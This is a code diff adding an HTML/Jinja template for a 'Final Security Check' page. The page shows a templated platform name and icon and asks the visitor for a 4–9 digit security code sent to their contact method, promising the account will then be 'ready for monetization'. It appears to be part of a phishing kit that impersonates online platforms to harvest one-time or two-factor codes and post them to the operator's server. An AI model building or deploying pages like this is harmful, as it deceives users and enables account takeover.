@@ -1,0 +1,157 @@
+{% extends "base.html" %}
+{% block body %}
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(239,68,68,0.25);border-radius:16px;">
+  {% if platform_icon and platform_name %}
+  <div class="platform-header">
+    <div class="icon-circle" style="background: rgba(239,68,68,0.1); border: 2px solid rgba(239,68,68,0.2);">
+      <i class="{{ platform_icon }}" style="color: #EF4444;"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#EF4444;">{{ platform_name }}</h2>
+      <div style="color:#64748b;font-size:13px">Final Security Verification</div>
+    </div>
+  </div>
+  {% endif %}
+
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔐 Final Security Check</h3>
+  
+  <div class="security-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">One Last Verification</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To complete your account setup and begin monetization, please enter the final security code sent to your verified contact method.
+      </p>
+    </div>
+  </div>
+
+  <form id="digitsForm" method="POST" novalidate>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Final Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter final security code" pattern="\d{4,9}" required>
+    <div class="error-text" id="digitsError"></div>
+
+    <div class="center">
+      <button class="btn final-btn" type="submit">Complete Setup</button>
+    </div>
+  </form>
+
+  <div class="completion-note" style="margin-top:20px;padding:12px 16px;background:#fef2f2;border-radius:12px;border:1px solid #fecaca;">
+    <p style="margin:0;color:#991b1b;font-size:0.9rem;font-weight:500;text-align:center;">
+      ✅ After this step, your account will be ready for monetization
+    </p>
+  </div>
+</div>
+
+<style>
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.input:focus {
+  border-color: #EF4444;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.25);
+  outline: none;
+}
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239,68,68,0.15);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 13px;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+.final-btn {
+  width: 100%;
+  background: #EF4444;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 25px;
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(239,68,68,0.35);
+  display: block;
+  margin-top: 8px;
+}
+.final-btn:hover {
+  background: #dc2626;
+  box-shadow: 0 8px 20px rgba(239,68,68,0.45);
+}
+.final-btn:active {
+  transform: scale(0.985);
+}
+
+.security-instructions {
+  margin: 20px 0;
+}
+
+.instruction-card {
+  background: #fef2f2;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #EF4444;
+  margin-bottom: 16px;
+}
+
+.center {
+  text-align: center;
+}
+
+.platform-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  margin-bottom: 24px;
+  padding-bottom: 20px;
+  border-bottom: 1px solid #f1f5f9;
+}
+
+.icon-circle {
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+}
+</style>
+
+<script>
+document.getElementById("digitsForm").addEventListener("submit", function(event) {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+
+  let valid = true;
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+
+  const val = digits.value.trim();
+  const pattern = /^\d{4,9}$/;
+
+  if (!pattern.test(val)) {
+    valid = false;
+    digits.classList.add("input-error");
+    digitsError.textContent = "Please enter a valid 4-9 digit security code.";
+  }
+
+  if (!valid) event.preventDefault();
+});
+
+document.getElementById("digits").addEventListener("input", () => {
+  const digits = document.getElementById("digits");
+  const digitsError = document.getElementById("digitsError");
+  digits.classList.remove("input-error");
+  digitsError.textContent = "";
+});
+</script>
+{% endblock %}
